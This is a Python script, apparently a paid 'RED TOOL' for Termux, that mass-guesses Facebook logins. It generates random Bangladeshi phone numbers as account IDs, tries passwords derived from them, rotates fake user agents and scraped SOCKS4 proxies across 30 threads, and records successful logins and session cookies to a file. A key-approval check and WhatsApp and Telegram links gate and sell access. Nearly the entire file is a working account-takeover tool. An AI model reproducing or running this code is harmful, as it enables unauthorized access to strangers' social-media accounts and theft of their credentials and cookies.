

import os,sys,time,json,random,re,string,platform,base64,uuid

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup

import requests as ress

from datetime import date

from datetime import datetime

from time import sleep

from os import system as s

from time import sleep as waktu

try:

    import requests

    from concurrent.futures import ThreadPoolExecutor as ThreadPool

    import mechanize

    from requests.exceptions import ConnectionError

except ModuleNotFoundError:

    os.system('pip install mechanize requests futures bs4==2 > /dev/null')

    os.system('pip install bs4')

    os.system('pkg install espeak')

RED = '\033[1;91m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m' 

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

P = '\x1b[1;97m' 

M = '\x1b[1;91m' 

H = '\x1b[1;92m' 

K = '\x1b[1;93m' 

B = '\x1b[1;94m' 

U = '\x1b[1;95m' 

O = '\x1b[1;96m' 

N = '\x1b[0m'    

A = '\x1b[1;90m' 

BN = '\x1b[1;107m' 

BBL = '\x1b[1;106m' 

BP = '\x1b[1;105m' 

BB = '\x1b[1;104m' 

BK = '\x1b[1;103m' 

BH = '\x1b[1;102m' 

BM = '\x1b[1;101m' 

BA = '\x1b[1;100m' 

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

today = date.today() 

loop = 0

oks = []

cps = []

ugen2=[]

ugen=[]

cokbrut=[]

ses=requests.Session()

princp=[]

try:

 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text

 open('.prox.txt','w').write(prox)

except Exception as e:

 print('')

prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):

    aa='Mozilla/5.0 (Linux; U; Android 11;'

    b=random.choice(['6','7','8','9','10','11','12'])

    c='fr-fr; Redmi Note 11 Build/'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

#Mozilla/5.0 (Linux; U; Android 11; fr-fr; Redmi Note 11 Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn

#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36

    aa='Mozilla/5.0 (Linux; Android 13;'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

    

    

    aa='Mozilla/5.0 (Linux; Android 10;'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

	

    aa='Mozilla/5.0 (Linux; Android 12;'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

	

	

    aa='Mozilla/5.0 (Linux; Android 11;'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

    

    aa='Mozilla/5.0 (Linux; Android 9;'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

os.system('xdg-open https://t.me/+626cHxTq2f9iYzdl')



logo = ("""

\033[1;91m██▐▄• ▄ ▄▄▄ .• ▌ ▄ ·.        ▐ ▄ 
 \033[1;91m█▌█▌▪▀▄.▀··██ ▐███▪▪     •█▌▐█
 \033[1;91m·██· ▐▀▀▪▄▐█ ▌▐▌▐█· ▄█▀▄ ▐█▐▐▌
\033[1;91m▪▐█·█▌▐█▄▄▌██ ██▌▐█▌▐█▌.▐▌██▐█▌
\033[1;91m•▀▀ ▀▀ ▀▀▀ ▀▀  █▪▀▀▀ ▀█▄▀▪▀▀ █▪                                                                                                                                        

             \x1b[37;41m\t WELLCOME TO RED TOOL\x1b[0;m\n\n\x1b[1;37m

\033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;93m ━━━━━━━━━━━━━━━━━━━━┐
\033[1;91m│ ❲★❳ AUTHOR   : 𝓧𝓮𝓶𝓸𝓷
\033[1;91m│ ❲★❳ GITHUB   : 𝓧𝓮𝓶𝓸𝓷          
\033[1;91m│ ❲★❳ WHATSAPP : +➑➑⓿➊➎➐➐⓿➊➒➏➌➋      
\033[1;91m│ ❲★❳ TOOLS    : \033[1;32mＮｏ Ｆｒｅｅ  \033[1;37m                         
\033[1;91m│ ❲★❳ VERSION  :   \033[1;35m     2025                                                                            
\033[1;93m└━━━━━━━━━━━━━━━━━━\033[1;93m ━━━━━━━━━━━━━━━━━━━━┘""")                   
balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
meyermarexudi =(""" \033[0;97m=============================================""")    
alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 7 DEYS 250TK 30 500TK FOR    APPROVAL""")
xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")
fuckyoursali =(""" \033[32;1m[𝟷] 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙸𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝙿𝙿𝚁𝙾𝚅𝙴𝙳""")
xudinaministar =(""" \033[32;1m[-] Importent Note """)
hedaborakarent =(""" \033[32;1m[??] 𝙵𝚄𝙲𝙺 𝙱𝚈𝙿𝙰𝚂𝙰𝚁 𝙲𝙷𝙰𝙺𝙴 𝚈𝙾𝚄𝚁 𝙳𝙰𝚃𝙰 """)
#____APPROVAL SYSTEM ADD_____#
def meyexudi():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Gojosaturo100pro/xemon/blob/main/xemon.txt').text
    if id in httpCaht:
      print(fuckyoursali)
      print(hedaborakarent)
      msg = str(os.geteuid())
      #time.sleep(0.5)
      print()
      pass
    else:
      print(meyermarexudi)
     # print(" \033[32;1m[+] Your Kay : "+id)
      print(' \x1b[38;5;208m╔══[𝟷] FREE USER NOT CAME INBOX')
      print(' \x1b[1;97m║══[𝟸] FREE-FIRE-TIK-TOK- ID CLONING')
      print(' \x1b[1;91m║══[𝟸] ONLY ACTIVE ID CLONE')
      print(' \x1b[1;92m║══[𝟸] UNACTIVE ID NOT ALLOW')
      print(' \x1b[1;93m║══[𝟸] CP ID LOGIN 50%')
      print(' \x1b[1;94m║══[𝟸] WI-FI WORKING 80%')
      print(' \x1b[1;95m║══[𝟸] 15 DAY 150 TAKA ')
      print(' \x1b[38;5;50m║══[𝟸] 30 DAY 250TAKA ')
      print(" \033[1;32m║══[𝟸] YOUR KEY : "+id)
      input(' \x1b[38;5;50m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801867850909?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()


class Main:

    def __init__(self):

        self.id = []

        self.ok = []

        self.cp = []

        self.loop = 0

        os.system("clear")

        print(logo)

        os.system('espeak -a 200 "WEELCAME , TO  , RED , TOOL"')

        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═XXX═\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")

        print(" [01] 𝚁𝚗𝚍𝚖[𝚇𝙴𝙼𝙾𝙽]")
       
        print(" [00] 𝙴𝚡𝚒𝚝")

        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═XXX═\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")

        Alif =input(" [?] 𝙲𝚑𝚘𝚘𝚜𝚎 : ")

        #os.system('xdg-open https://t.me/+626cHxTq2f9iYzdl')

        if Alif in ["1", "01"]:

            num()

        if Alif in [" 0", "00"]:

            exit()

        else:

            exit()

def num():

    user=[]

    os.system('clear')

    print(logo)

    print(' [+] 𝙴𝚇𝙰𝙼𝙿𝙻𝙴 : 017, 018, 019, 016, 013, 014 ')

    #os.system('espeak -a 200 "Select your Number"')

    kode = input(' [?] 𝚂𝙸𝙼 𝙲𝙾𝙳𝙴: ')

    kodex = ''.join(random.choice(string.digits) for _ in range(2))

    kod = ''.join(random.choice(string.digits) for _ in range(2))

    os.system('clear')

    print(logo)

    print(' [+] 𝙴𝚇𝙰𝙼𝙿𝙻𝙴 : 3000, 5000, 10000, 50000 ')

    #os.system('espeak -a 200 "select Crack Limit"')

    limit = int(input(' [?] 𝙲𝚛𝚊𝚌𝚔 𝚈𝚘𝚞𝚛 𝙻𝚒𝚖𝚒𝚝 : '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(4))

        user.append(nmp)

    with ThreadPool(max_workers=30) as noob:

        os.system('clear')

        print(logo)

        #os.system('espeak -a 200 "Random , Xemon"')

        tl = str(len(user))

        print("\033[1;91m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")

        print(' \033[1;92m[+] Total Ids:\033[1;92m '+tl)

        print(' \033[1;92m[+] 𝙿𝚛𝚘𝚌𝚎𝚜𝚜 𝙷𝚊𝚜 𝙱𝚎𝚎𝚗 𝚂𝚝𝚊𝚛𝚝𝚎𝚍')

        print(' \033[1;92m[+] Ꮗ8 ')

        print(' \033[1;92m[+] 𝚄𝚜𝚎 𝙵𝚕𝚒𝚐𝚑𝚝 𝙼𝚘𝚍𝚎 𝙵𝚘𝚛 𝚂𝚙𝚎𝚎𝚍 𝚄𝚙 ')

        print("\033[1;92m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")

        for guru in user:

            uid = kode+kodex+kod+guru

            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'i love you,Bangladesh']

            noob.submit(rcrack1,uid,pwx,tl)

    print(' [+] Crack process has been completed')

    print(' [+] Ids saved in xemon.txt,cp.txt')



def rcrack1(uid,pwx,tl):

    global loop

    global cps

    global oks

    global proxy

    try:

        for ps in pwx:

            pro = random.choice(ugen)

            session = requests.Session()

            sys.stdout.write('\r[\x1b[\033[\033[1;32mRED] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),

            sys.stdout.flush()

            free_fb = session.get('https://m.alpha.facebook.com').text

            log_data = {

                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":uid,

            "pass":ps,

            "login":"Log In"}

            header_freefb = {"authority": 'm.alpha.facebook.com',
            "method": 'GET',
            "scheme": 'https',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
           'cache-control': 'max-age=0',           
           'dpr': '2.625',
           'referer': 'https://m.alpha.facebook.com/?paipv=0&eav=AfZ8Gp34Q1hL9klLOrSSdcyZKQ9k5nW5LGDgloRLAZ_6_E1XQIZjYtjVxbYJOemRuxM&_rdc=1&_rdr',
           'sec-ch-prefers-color-scheme': 'dark',
           'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="123", "Google Chrome";v="123"',
           'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="123.0.6261.204", "Google Chrome";v="123.0.6261.204"',
           'sec-ch-ua-mobile': '?0',
           'sec-ch-ua-model': '""',
           'sec-ch-ua-platform': '"Linux"',
           'sec-ch-ua-platform-version': '""',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'same-origin',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': 'pro',
           'viewport-width': '980',}
            lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[7:22]

                print(f"\033[38;5;46m[RED👙OK] {uid} | {ps}")

                os.system('espeak -a 200 "CONGRATULATIONS"')
                
                print(f" cookie 🍪: {coki} =\033[1;35m'")

                open('/sdcard/RED.txt', 'a').write(uid+' | '+ps+'\n')

                oks.append(uid)

                break

            elif 'checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[82:97]

              #  print(f"\x1b[38;5;196m[X-CP🩸] {uid}|{ps} = \033[1;34m'+pro+'  \033[0;97m")

              #  open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')

                cps.append(uid)

                break

            else:

                continue

        loop+=1

        sys.stdout.write(f'\r\033[\0[\x1b[\033[\033[1;91mRED👙OK] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),

        sys.stdout.flush()

    except:

        pass

Main()